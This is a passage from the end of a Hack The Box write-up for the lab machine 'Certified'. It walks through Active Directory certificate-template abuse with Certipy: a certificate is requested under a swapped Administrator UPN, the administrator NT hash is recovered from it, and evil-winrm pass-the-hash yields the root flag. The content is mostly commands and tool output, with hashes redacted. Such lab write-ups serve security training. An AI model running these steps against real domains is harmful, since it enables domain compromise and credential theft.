\u0026lt;...\u0026gt; $ certipy-ad req -username \u0026#34;ca_operator@certified.htb\u0026#34; -hashes b\u0026lt;...\u0026gt;2 -target \u0026#34;10.10.11.41\u0026#34; -ca \u0026#39;certified-DC01-CA\u0026#39; -template \u0026#39;CertifiedAuthentication\u0026#39; Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 7 [*] Got certificate with UPN \u0026#39;Administrator\u0026#39; [*] Certificate has no object SID [*] Saved certificate and private key to \u0026#39;administrator.pfx\u0026#39; Finally, we can change back the userPrincipalName of ca_operator to themself and we can retrieve the administrator NT hash using the generated administrator.pfx file. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ certipy-ad account update -username \u0026#34;management_svc@certified.htb\u0026#34; -hashes a\u0026lt;...\u0026gt;4 -user ca_operator -upn \u0026#34;ca_operator@certified.htb\u0026#34; -dc-ip 10.10.11.41 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_operator\u0026#39;: userPrincipalName : ca_operator@certified.htb [*] Successfully updated \u0026#39;ca_operator\u0026#39; $ certipy-ad auth -pfx \u0026#39;administrator.pfx\u0026#39; -domain \u0026#34;certified.htb\u0026#34; Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@certified.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@certified.htb\u0026#39;: a\u0026lt;...\u0026gt;e:0\u0026lt;...\u0026gt;4 With this hash, the root flag can be retrieved using evil-winrm. 1 2 3 4 5 $ evil-winrm -i 10.10.11.41 -u Administrator -H 0\u0026lt;...\u0026gt;4 \u0026lt;...\u0026gt; Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 3/13/2025 2:54 PM 34 root.txt Resources thehacker.recipes - certificate templates\n","date":"2025-03-15T00:00:00Z","image":"https://01MI.github.io/p/certified-htb-writeup-windows-medium/Certified_hu_7767539059846492.PNG","permalink":"https://01MI.github.io/p/certified-htb-writeup-windows-medium/","title":"Certified - Windows Medium - HTB Writeup"}]